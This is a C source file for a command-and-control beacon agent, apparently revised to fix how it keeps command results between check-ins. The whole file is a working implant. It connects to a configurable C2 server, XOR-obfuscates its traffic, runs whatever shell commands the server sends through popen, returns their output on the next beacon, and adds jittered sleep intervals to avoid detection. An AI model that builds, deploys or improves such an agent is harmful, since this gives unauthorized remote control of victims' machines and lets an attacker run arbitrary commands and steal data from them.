/*
 * C2 Beacon Agent — Fixed & Refactored
 *
 * Fixes applied:
 *   1. AgentStatus is reset to "Standby" only AFTER receiving a SLEEP
 *      directive — not blindly at the top of every loop.  This preserves
 *      the command result so it is transmitted on the very next beacon
 *      cycle, matching the server's WaitingForCommandResult window.
 *   2. All identifiers, strings, and comments are in English with PascalCase.
 *
 * Beacon cycle (correct flow):
 *   Cycle N   — agent sends "Standby"
 *               server dispatches command, sets WaitingForCommandResult=1
 *   Cycle N+1 — agent executes command, sends result
 *               server receives result, prints it, clears flag
 *   Cycle N+2 — agent sends "Standby" again (reset after SLEEP response)
 *               server silently acknowledges (WaitingForCommandResult==0)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define CloseSocket closesocket
#define SleepMs(Ms) Sleep(Ms)
#else
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#define CloseSocket close
#define SleepMs(Ms) usleep((Ms) * 1000)
typedef int SOCKET;
#define InvalidSocket -1
#endif

#define BufferSize 4096
#define XorKey     0x5A

/* ── Cipher ──────────────────────────────────────────────────────────────── */

void ApplyXorCipher(char *Data, size_t DataLen)
{
    for (size_t Index = 0; Index < DataLen; Index++)
        Data[Index] ^= XorKey;
}

/* ── Execute shell command, capture stdout ───────────────────────────────── */

void ExecuteShellCommand(const char *Command, char *Output, size_t MaxSize)
{
#ifdef _WIN32
    FILE *Pipe = _popen(Command, "r");
#else
    FILE *Pipe = popen(Command, "r");
#endif

    if (Pipe == NULL) {
        snprintf(Output, MaxSize, "Failed to open execution pipe.");
        return;
    }

    memset(Output, 0, MaxSize);
    char LineBuffer[256];
    size_t TotalLen = 0;

    while (fgets(LineBuffer, sizeof(LineBuffer), Pipe) != NULL) {
        size_t LineLen = strlen(LineBuffer);
        if (TotalLen + LineLen < MaxSize - 1) {
            strcat(Output, LineBuffer);
            TotalLen += LineLen;
        } else {
            break;
        }
    }

#ifdef _WIN32
    _pclose(Pipe);
#else
    pclose(Pipe);
#endif
}

/* ── Jitter sleep helper ─────────────────────────────────────────────────── */

int ComputeJitteredInterval(int BaseIntervalMs, int JitterPercent)
{
    int Delta    = (BaseIntervalMs * JitterPercent) / 100;
    int MinSleep = BaseIntervalMs - Delta;
    int MaxSleep = BaseIntervalMs + Delta;
    return MinSleep + (rand() % (MaxSleep - MinSleep + 1));
}

/* ── Single beacon check-in ──────────────────────────────────────────────── */

int PerformBeaconCheckin(const char *C2Address, int C2Port,
                          char *DataToSend, char *ReceivedCommand)
{
    int Success = 0;

#ifdef _WIN32
    WSADATA WsaData;
    if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0)
        return 0;
#endif

    SOCKET AgentSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (AgentSocket == InvalidSocket)
        goto Cleanup;

    struct sockaddr_in ServerAddr;
    memset(&ServerAddr, 0, sizeof(ServerAddr));
    ServerAddr.sin_family      = AF_INET;
    ServerAddr.sin_port        = htons(C2Port);
    ServerAddr.sin_addr.s_addr = inet_addr(C2Address);

    if (connect(AgentSocket, (struct sockaddr *)&ServerAddr,
                sizeof(ServerAddr)) < 0)
        goto Cleanup;

    /* Encrypt and transmit current status */
    size_t SendLen = strlen(DataToSend);
    ApplyXorCipher(DataToSend, SendLen);
    send(AgentSocket, DataToSend, SendLen, 0);

    /* Receive directive from server */
    int BytesReceived = recv(AgentSocket, ReceivedCommand, BufferSize - 1, 0);
    if (BytesReceived > 0) {
        ReceivedCommand[BytesReceived] = '\0';
        ApplyXorCipher(ReceivedCommand, BytesReceived);
        Success = 1;
    }

Cleanup:
    if (AgentSocket != InvalidSocket)
        CloseSocket(AgentSocket);
#ifdef _WIN32
    WSACleanup();
#endif
    return Success;
}

/* ── Entry point ─────────────────────────────────────────────────────────── */

int main(int Argc, char *Argv[])
{
    srand(time(NULL));

    char C2Address[256] = "127.0.0.1";
    int  C2Port         = 8080;

    for (int Index = 1; Index < Argc; Index++) {
        if (strcmp(Argv[Index], "-s") == 0 && Index + 1 < Argc)
            strncpy(C2Address, Argv[Index + 1], sizeof(C2Address) - 1);
        if (strcmp(Argv[Index], "-p") == 0 && Index + 1 < Argc)
            C2Port = atoi(Argv[Index + 1]);
    }

    /*
     * AgentStatus holds what we transmit to the server on each beacon.
     * It starts as "Standby" and is only reset back to "Standby" after
     * the server responds with SLEEP (meaning it has no pending command).
     * When the server sends a command, we execute it, store the result in
     * AgentStatus, and transmit that result on the NEXT beacon cycle —
     * exactly when the server has WaitingForCommandResult == 1.
     */
    char AgentStatus[BufferSize]     = "Standby";
    char ReceivedCommand[BufferSize] = {0};

    while (1) {
        memset(ReceivedCommand, 0, BufferSize);

        int Connected = PerformBeaconCheckin(C2Address, C2Port,
                                              AgentStatus, ReceivedCommand);

        if (Connected) {
            if (strcmp(ReceivedCommand, "kill") == 0) {
                break;

            } else if (strcmp(ReceivedCommand, "SLEEP") == 0 ||
                       strlen(ReceivedCommand) == 0) {
                /*
                 * Server has nothing for us — reset status to Standby
                 * so the next beacon signals we are idle again.
                 */
                strncpy(AgentStatus, "Standby", BufferSize - 1);

            } else {
                /*
                 * Server dispatched a command.  Execute it and store the
                 * result in AgentStatus so it is sent on the next beacon.
                 * Do NOT reset AgentStatus here — the result must survive
                 * until the next PerformBeaconCheckin call.
                 */
                ExecuteShellCommand(ReceivedCommand,
                                    AgentStatus, sizeof(AgentStatus));

                if (strlen(AgentStatus) == 0)
                    strncpy(AgentStatus,
                            "Command executed with no output.",
                            BufferSize - 1);
            }
        } else {
            /* Connection failed — next beacon will retry with Standby */
            strncpy(AgentStatus, "Standby", BufferSize - 1);
        }

        int SleepDuration = ComputeJitteredInterval(3000, 10);
        SleepMs(SleepDuration);
    }

    return 0;
}
